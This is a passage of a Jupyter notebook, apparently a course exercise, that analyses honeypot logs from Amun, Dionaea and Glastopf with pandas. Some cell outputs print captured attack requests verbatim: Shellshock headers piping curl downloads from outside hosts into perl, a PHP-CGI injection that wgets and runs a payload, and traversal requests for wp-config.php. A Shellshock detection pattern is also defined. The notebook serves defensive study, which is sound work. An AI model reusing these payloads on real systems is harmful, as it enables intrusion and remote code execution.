       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>attackerID</th>\n",
       "      <th>attackerIP</th>\n",
       "      <th>attackerPort</th>\n",
       "      <th>channel</th>\n",
       "      <th>connectionType</th>\n",
       "      <th>downloadMethod</th>\n",
       "      <th>normalized</th>\n",
       "      <th>shellcodeName</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>victimIP</th>\n",
       "      <th>victimPort</th>\n",
       "      <th>vulnName</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>NaN</td>\n",
       "      <td>162.197.24.67</td>\n",
       "      <td>57230</td>\n",
       "      <td>amun.events</td>\n",
       "      <td>initial</td>\n",
       "      <td>NaN</td>\n",
       "      <td>True</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'$date': '2014-09-28T04:55:17.147+0000'}</td>\n",
       "      <td>172.31.13.124</td>\n",
       "      <td>80</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   attackerID     attackerIP  attackerPort      channel connectionType  \\\n",
       "0         NaN  162.197.24.67         57230  amun.events        initial   \n",
       "\n",
       "  downloadMethod  normalized shellcodeName  \\\n",
       "0            NaN        True           NaN   \n",
       "\n",
       "                                   timestamp       victimIP  victimPort  \\\n",
       "0  {'$date': '2014-09-28T04:55:17.147+0000'}  172.31.13.124          80   \n",
       "\n",
       "  vulnName  \n",
       "0      NaN  "
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "amun_df.head(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. What are the use cases for Amun? How/would you use this in a production enterprise?  \n",
    "2. What are the limitations?\n",
    "3. Describe the features (columns) in the amun dataframe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First, let's drop unnecessary columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "371317"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(amun_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "attackerID        371317\n",
       "attackerIP             0\n",
       "attackerPort           0\n",
       "channel                0\n",
       "connectionType         0\n",
       "downloadMethod    366765\n",
       "normalized             0\n",
       "shellcodeName     366765\n",
       "timestamp              0\n",
       "victimIP               0\n",
       "victimPort             0\n",
       "vulnName          366765\n",
       "dtype: int64"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "amun_df.isnull().sum() # let's get the count of NAs across all columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "amun_df = amun_df.drop(['attackerID'], axis=1) # since attackerID is only filled with NAs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "bind://172.31.14.66:5155/                                                         2247\n",
       "http://ccm.zju.edu.cn:80/wp-content/themes/edupress/scripts/sekip.php             1761\n",
       "http://54.169.48.132:9999/manager/html                                             143\n",
       "http://s1.bdstatic.com:80/r/www/cache/static/home/img/logos/nuomi_ade5465d.png      86\n",
       "http://myinfo.any-request-allowed.com:80/;a=tt4mq2&b=e33bu                          78\n",
       "Name: downloadMethod, dtype: int64"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "amun_df.downloadMethod.value_counts()[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "plainurl      2289\n",
       "schoenborn    2247\n",
       "mydoom          12\n",
       "None             2\n",
       "adenau           1\n",
       "langenfeld       1\n",
       "Name: shellcodeName, dtype: int64"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "amun_df.shellcodeName.value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "MS08067 (NetAPI)          2249\n",
       "HTTP Vulnerability        1768\n",
       "MaxDB Vulnerability        331\n",
       "IIS Vulnerability          149\n",
       "TIVOLI Vulnerability        33\n",
       "MYDOOM Vulnerability        12\n",
       "MS04011 (LSASS)              8\n",
       "SYMANTEC Vulnerability       1\n",
       "DCOM Vulnerability           1\n",
       "Name: vulnName, dtype: int64"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "amun_df.vulnName.value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. Describe any interesting things you see in the Amun dataset."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Explore Dionaea Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>channel</th>\n",
       "      <th>connection_protocol</th>\n",
       "      <th>connection_transport</th>\n",
       "      <th>connection_type</th>\n",
       "      <th>local_host</th>\n",
       "      <th>local_port</th>\n",
       "      <th>normalized</th>\n",
       "      <th>remote_host</th>\n",
       "      <th>remote_hostname</th>\n",
       "      <th>remote_port</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>timestamp</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2015-03-03 16:40:31.681</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>23</td>\n",
       "      <td>True</td>\n",
       "      <td>176.232.136.46</td>\n",
       "      <td></td>\n",
       "      <td>44516</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                     channel connection_protocol  \\\n",
       "timestamp                                                          \n",
       "2015-03-03 16:40:31.681  dionaea.connections                pcap   \n",
       "\n",
       "                        connection_transport connection_type      local_host  \\\n",
       "timestamp                                                                      \n",
       "2015-03-03 16:40:31.681                  tcp          reject  162.244.30.100   \n",
       "\n",
       "                         local_port  normalized     remote_host  \\\n",
       "timestamp                                                         \n",
       "2015-03-03 16:40:31.681          23        True  176.232.136.46   \n",
       "\n",
       "                        remote_hostname  remote_port  \n",
       "timestamp                                             \n",
       "2015-03-03 16:40:31.681                        44516  "
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dionaea_conn_df.head(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>channel</th>\n",
       "      <th>daddr</th>\n",
       "      <th>dport</th>\n",
       "      <th>md5</th>\n",
       "      <th>normalized</th>\n",
       "      <th>saddr</th>\n",
       "      <th>sha512</th>\n",
       "      <th>sport</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>url</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>dionaea.capture</td>\n",
       "      <td>::ffff:162.244.30.100</td>\n",
       "      <td>445</td>\n",
       "      <td>d41d8cd98f00b204e9800998ecf8427e</td>\n",
       "      <td>True</td>\n",
       "      <td>::ffff:59.91.121.86</td>\n",
       "      <td>cf83e1357eefb8bdf1542850d66d8007d620e4050b5715...</td>\n",
       "      <td>4719</td>\n",
       "      <td>2015-05-13T02:19:38.400+0000</td>\n",
       "      <td>smb://::ffff:59.91.121.86</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "           channel                  daddr dport  \\\n",
       "0  dionaea.capture  ::ffff:162.244.30.100   445   \n",
       "\n",
       "                                md5  normalized                saddr  \\\n",
       "0  d41d8cd98f00b204e9800998ecf8427e        True  ::ffff:59.91.121.86   \n",
       "\n",
       "                                              sha512 sport  \\\n",
       "0  cf83e1357eefb8bdf1542850d66d8007d620e4050b5715...  4719   \n",
       "\n",
       "                      timestamp                        url  \n",
       "0  2015-05-13T02:19:38.400+0000  smb://::ffff:59.91.121.86  "
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dionaea_cap_df.head(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. What are the use cases for Dionaea? How/would you use this in a production enterprise?  \n",
    "2. What are the limitations?\n",
    "3. Describe each of the feautres (columns) in the dionaea_conn_df and dionaea_cap_df datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**First let's drop unnecessary columns**  \n",
    "**[Task]**  \n",
    "Explain why you dropped columns you deemed unncessary."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dionaea_conn_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "575180"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(dionaea_conn_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "dionaea_conn_df = dionaea_conn_df.drop([], axis=1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dionaea_cap_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "543"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(dionaea_cap_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "dionaea_cap_df = dionaea_cap_df.drop([], axis=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "smb://::ffff:117.196.248.230    142\n",
       "smb://::ffff:117.196.239.241     83\n",
       "smb://::ffff:117.196.247.78      83\n",
       "smb://::ffff:117.220.61.105      44\n",
       "smb://::ffff:117.220.0.168       27\n",
       "Name: url, dtype: int64"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dionaea_cap_df['url'].value_counts()[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. Describe any interesting things you see in the Dionaea dataset."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Explore Glastopf Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>channel</th>\n",
       "      <th>filename</th>\n",
       "      <th>normalized</th>\n",
       "      <th>pattern</th>\n",
       "      <th>request_raw</th>\n",
       "      <th>request_url</th>\n",
       "      <th>source</th>\n",
       "      <th>time</th>\n",
       "      <th>timestamp</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>glastopf.events</td>\n",
       "      <td>None</td>\n",
       "      <td>True</td>\n",
       "      <td>style_css</td>\n",
       "      <td>GET /style.css HTTP/1.1\\r\\nAccept: text/css,*/...</td>\n",
       "      <td>/style.css</td>\n",
       "      <td>[162.197.24.67, 60871]</td>\n",
       "      <td>2014-09-27 05:04:58</td>\n",
       "      <td>2014-09-27T05:04:46.363+0000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "           channel filename  normalized    pattern  \\\n",
       "0  glastopf.events     None        True  style_css   \n",
       "\n",
       "                                         request_raw request_url  \\\n",
       "0  GET /style.css HTTP/1.1\\r\\nAccept: text/css,*/...  /style.css   \n",
       "\n",
       "                   source                 time                     timestamp  \n",
       "0  [162.197.24.67, 60871]  2014-09-27 05:04:58  2014-09-27T05:04:46.363+0000  "
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "glastopf_df.head(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. What are the use cases for Glastopf? How/would you use this in a production enterprise?  \n",
    "2. What are the limitations?\n",
    "3. Describe the features (columns) in the glastopf dataframe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**First, let's drop unnecessary columns**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "7199"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(glastopf_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "channel           0\n",
       "filename       7199\n",
       "normalized        0\n",
       "pattern           0\n",
       "request_raw       0\n",
       "request_url       0\n",
       "source            0\n",
       "time              0\n",
       "timestamp         0\n",
       "dtype: int64"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "glastopf_df.isnull().sum() # let's get the count of NAs across all columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "glastopf_df = glastopf_df.drop(['channel', 'filename', 'normalized', 'time'], axis=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>pattern</th>\n",
       "      <th>request_raw</th>\n",
       "      <th>request_url</th>\n",
       "      <th>source</th>\n",
       "      <th>timestamp</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>style_css</td>\n",
       "      <td>GET /style.css HTTP/1.1\\r\\nAccept: text/css,*/...</td>\n",
       "      <td>/style.css</td>\n",
       "      <td>[162.197.24.67, 60871]</td>\n",
       "      <td>2014-09-27T05:04:46.363+0000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "     pattern                                        request_raw request_url  \\\n",
       "0  style_css  GET /style.css HTTP/1.1\\r\\nAccept: text/css,*/...  /style.css   \n",
       "\n",
       "                   source                     timestamp  \n",
       "0  [162.197.24.67, 60871]  2014-09-27T05:04:46.363+0000  "
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "glastopf_df.head(1) # print the first row of the dataframe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Regex**  \n",
    "We can then use regex (regular expressions) to extract the user agent string from the Request_Raw column.  Let's add that to the dataframe."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>channel</th>\n",
       "      <th>filename</th>\n",
       "      <th>normalized</th>\n",
       "      <th>pattern</th>\n",
       "      <th>request_raw</th>\n",
       "      <th>request_url</th>\n",
       "      <th>source</th>\n",
       "      <th>time</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>method</th>\n",
       "      <th>user-agent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>glastopf.events</td>\n",
       "      <td>None</td>\n",
       "      <td>True</td>\n",
       "      <td>style_css</td>\n",
       "      <td>GET /style.css HTTP/1.1\\r\\nAccept: text/css,*/...</td>\n",
       "      <td>/style.css</td>\n",
       "      <td>[162.197.24.67, 60871]</td>\n",
       "      <td>2014-09-27 05:04:58</td>\n",
       "      <td>2014-09-27T05:04:46.363+0000</td>\n",
       "      <td>GET</td>\n",
       "      <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "           channel filename  normalized    pattern  \\\n",
       "0  glastopf.events     None        True  style_css   \n",
       "\n",
       "                                         request_raw request_url  \\\n",
       "0  GET /style.css HTTP/1.1\\r\\nAccept: text/css,*/...  /style.css   \n",
       "\n",
       "                   source                 time                     timestamp  \\\n",
       "0  [162.197.24.67, 60871]  2014-09-27 05:04:58  2014-09-27T05:04:46.363+0000   \n",
       "\n",
       "  method                                         user-agent  \n",
       "0   GET    Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5...  "
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "regex = re.compile('.*[Uu][Ss][Ee][Rr]-[Aa][Gg][Ee][Nn][Tt]:(.*?)(?:\\\\r|$)')\n",
    "glastopf_df['user-agent'] = glastopf_df['request_raw'].apply(lambda x: re.search(regex, x).group(1) if re.search(regex, x) else None)\n",
    "glastopf_df.head(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Task/Question]**  \n",
    "- Add a feature, HTTP Method, to the glastopf dataframe.  Read about using the .str.split() method.  (hint: '/')\n",
    "Find out what is the most commonly used http method.  \n",
    "- Is there anything unusual?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]** \n",
    "1. What are the 5 most popular user-agent strings? (hint: value_counts()[:5])\n",
    "2. What are the 5 most popular source IPs? Use the glastopf_df['source'] column"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Searching Strings**  \n",
    "Just as we can extract and manipulate strings from columns, we can search string columns to find things.  Since we have the raw message of the request, we can use this to search for suspicious things in requests."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Read and learn about Shellshock: https://blog.cloudflare.com/inside-shellshock/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. What are the patterns used in Shellshock?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's search the request_raw column..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nConnection: close\\r\\nContent-Length: 160\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\\r\\n<?php\\n system(\" id;killall .klogd;cd /var/tmp;rm -rf ...;mkdir ...;cd ...;wget http://82.141.104.123/ispconfig/temp/.../.../x.tgz;tar xvfz x.tgz;./.klogd \"); ?>    2\n",
       "GET /admin/doeditconfig.php?thispath=../includes'&config[path]= HTTP/1.1\\r\\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\\r\\nAccept-Encoding: gzip\\r\\nConnection: keep-alive\\r\\nHost: 54.68.96.53\\r\\nReferer: http://54.68.96.53/admin/doeditconfig.php?thispath=../includes'&config[path]=\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0\\r\\nX-Forward-For: 88.99.198.85                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               1\n",
       "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=..%2Fwp-config.php HTTP/1.1\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Baiduspider                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      1\n",
       "Name: request_raw, dtype: int64"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "glastopf_df[glastopf_df['request_raw'].str.contains('\\.\\.')]['request_raw'].value_counts()[:3] # only show the first 3 rows"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**  \n",
    "- What do you think the pattern '\\.\\.' is used to detect?  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "shell_shock_pattern = '() { :; };'# fill in with the 'magic string' referenced in the cloudflare article above"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/carrie/anaconda/envs/mlbook/lib/python3.5/site-packages/ipykernel/__main__.py:1: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.\n",
      "  if __name__ == '__main__':\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "GET / HTTP/1.0\\r\\nCache-Control: no-cache\\r\\nConnection: Keep-Alive\\r\\nCookie: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl\\r\\nPragma: no-cache\\r\\nReferer: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl\\r\\nTest: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl\\r\\nUser-Agent: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl    5\n",
       "GET /cgi-bin/w3mman2html.cgi HTTP/1.0\\r\\nCache-Control: no-cache\\r\\nConnection: Keep-Alive\\r\\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\\r\\nPragma: no-cache\\r\\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\\r\\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\\r\\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl                         4\n",
       "GET /cgi-bin/test-cgi HTTP/1.0\\r\\nCache-Control: no-cache\\r\\nConnection: Keep-Alive\\r\\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\\r\\nPragma: no-cache\\r\\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\\r\\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\\r\\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl                                4\n",
       "Name: request_raw, dtype: int64"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "shell_shock_requests = glastopf_df[glastopf_df['request_raw'].str.contains(shell_shock_pattern)]['request_raw'].value_counts()[:3] # only show the first 3 rows\n",
    "shell_shock_requests"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**  \n",
    "- Great, so now we know there's evidence some attackers tried to exploit the Shellshock vulneraiblity on the honeypot.  What IP addresses are they from?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/carrie/anaconda/envs/mlbook/lib/python3.5/site-packages/ipykernel/__main__.py:1: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.\n",
      "  if __name__ == '__main__':\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array(['http://www.baidu.com\\r\\nUser-Agent:',\n",
       "       'http://www.ykum.com//bbs/skin/zero_vote/cpan_root',\n",
       "       'http://202.143.160.141/lib21/index.cgi',\n",
       "       'http://121.12.173.173:81/9521', 'http://61.160.212.172:911/java',\n",
       "       'a', 'http://117.21.226.160:8080/77y',\n",
       "       'http://85.18.113.32/gate.php?w1-`uname`-`uname',\n",
       "       'http://121.207.230.74:911/java',\n",
       "       'http://houmen.linux22.cn:123/houmen/linux223',\n",
       "       'http://202.103.243.104:911/sudp',\n",
       "       'http://23.252.167.99:8806/cctv2'], dtype=object)"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "glastopf_df[glastopf_df['request_raw'].str.contains(shell_shock_pattern)]['request_raw'].apply(lambda x: x[x.find('http://'):x[x.find('http://'):].find(' ') + x.find('http://')] if x.find('http://') > 0 else 'a').unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Explore Snort Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
